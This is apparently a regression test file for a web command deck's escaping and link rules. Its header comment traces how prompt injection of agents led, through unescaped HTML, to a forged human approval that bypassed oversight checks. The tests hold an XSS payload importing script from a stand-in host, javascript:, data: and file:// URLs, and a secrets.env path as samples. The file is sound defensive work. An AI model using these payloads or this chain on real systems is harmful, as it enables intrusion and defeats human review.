/**
 * Regression tests for the deck briefing panel's escaping, and for the
 * http(s)-only rule on a proposal's artifact link.
 *
 * THE CHAIN (2026-08-15, found by a full-repo bug audit). Three independently
 * shipped bugs composed into prompt-injection -> forged human approval:
 *
 *   1. showBriefing()'s row() helper concatenated server data into innerHTML
 *      with no escaping — the one panel in the deck that didn't. Job task text
 *      is attacker-reachable: POST /dispatch validates `task` not at all, and
 *      dispatched agents run as root and are the things that read untrusted web
 *      pages. Payload fits the 80-char slice:
 *          <img src=x onerror=import('https://ev.il/p.js')>
 *   2. No CSP header anywhere on deck-server, so it executed in the deck's
 *      origin, which holds a sliding 30-day cookie.
 *   3. POST /api/ops/review hardcoded actor_id:'craig', actor_kind:'human', and
 *      gated on isAuthed() OR isLocalDirect() — the latter true for any on-box
 *      process. actor_kind:'human' then made canTransition() skip separation of
 *      duties, the owning-officer check, ALWAYS_HUMAN and the escalated-proposal
 *      lock, and the append-only trail recorded a human approval no human made.
 *
 * The trigger was Craig saying "morning briefing" while a poisoned job ran.
 *
 * These tests pin link 1 and the second, simpler path to the same place: an
 * agent-supplied `artifact_url` of `javascript:...` executing on the click that
 * the REVIEW panel explicitly steers him into making (it offers APPROVE only
 * once an artifact exists). Links 2 and 3 are enforced server-side in
 * deck-server.js / memory-server.js.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const DECK = readFileSync(
  join(dirname(fileURLToPath(import.meta.url)), '..', 'public', 'command-deck.html'), 'utf8');

// The deck is one large HTML file with inline script; these tests read the
// source rather than booting a DOM, which is how the other deck tests work.

test('the briefing row helper escapes both server-supplied fields', () => {
  const row = DECK.match(/const row = \(dot, name, extra, extraColor\) =>[\s\S]{0,400}?'<\/div>';/);
  assert.ok(row, 'showBriefing row() helper not found — did it move?');
  const src = row[0];
  assert.match(src, /esc\(name\)/, 'platform/job name must be escaped');
  assert.match(src, /esc\(extra\)/, 'job task / issue text must be escaped');
  assert.ok(
    !/\+ name \+/.test(src) && !/\+ extra \+/.test(src),
    'no raw concatenation of server values may remain in row()',
  );
});

test('esc() covers every character that can break out of text or an attribute', () => {
  const escSrc = DECK.match(/function esc\(s\) \{[\s\S]*?\n\}/);
  assert.ok(escSrc, 'esc() not found');
  // Assert on the ENTITIES produced, not the quoting of the map's keys — the
  // apostrophe key is legitimately written "'" with double quotes.
  for (const entity of ['&amp;', '&lt;', '&gt;', '&quot;', '&#39;']) {
    assert.ok(escSrc[0].includes(entity), `esc() must produce ${entity}`);
  }
  assert.match(escSrc[0], /\[&<>"'\]/, 'the character class must cover all five');
});

test('the payload that motivated this cannot survive esc()', () => {
  // Reimplement esc() exactly as the deck defines it and run the real payload.
  const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

  const payload = `<img src=x onerror=import('https://ev.il/p.js')>`;
  const out = esc(payload);
  assert.ok(!out.includes('<img'), 'the tag must not survive');
  assert.ok(!out.includes('onerror=') || !out.includes('<'), 'no live element can form');
  assert.match(out, /&lt;img/);

  // And the attribute-breaking variant, since row() also interpolates into a
  // style="" attribute context for its colour arguments.
  assert.ok(!esc(`" onmouseover="alert(1)`).includes('"'));
});

test('every server-supplied value in showBriefing goes through esc()', () => {
  // Guards the fields row() does not own: the unresolved-issues count.
  const fn = DECK.match(/function showBriefing\(d\) \{[\s\S]*?\n\}/);
  assert.ok(fn, 'showBriefing not found');
  const body = fn[0];
  assert.ok(
    !/\+ d\.openIssues \+/.test(body),
    'd.openIssues must be escaped, not concatenated raw',
  );
});

test('an artifact link is http(s) only — javascript: is refused', () => {
  // The second path to a forged approval. target="_blank" is no defence: every
  // browser runs a javascript: href against the current document regardless.
  const guard = DECK.match(/const safeArtifact = [^\n]*/);
  assert.ok(guard, 'artifact_url scheme guard not found');
  assert.match(guard[0], /\^https\?:\\\/\\\//, 'must anchor on ^https?://');

  const isSafe = (u) => /^https?:\/\//i.test(String(u || ''));
  const attacks = [
    `javascript:fetch('/api/ops/review',{method:'POST'})`,
    'JaVaScRiPt:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///opt/jarvis/config/secrets.env',
    '//evil.tld/x',
    ' javascript:alert(1)',
  ];
  for (const a of attacks) assert.equal(isSafe(a), false, `${a} must be refused`);
  for (const ok of ['http://x.test/d.diff', 'https://github.test/pr/1']) {
    assert.equal(isSafe(ok), true, `${ok} must be allowed`);
  }
});

test('a refused artifact link says so rather than looking like "no diff yet"', () => {
  // A silently dropped link would read as "the agent has not attached one",
  // which is a different and misleading statement.
  assert.match(DECK, /artifact link refused \(not http\/https\)/);
});
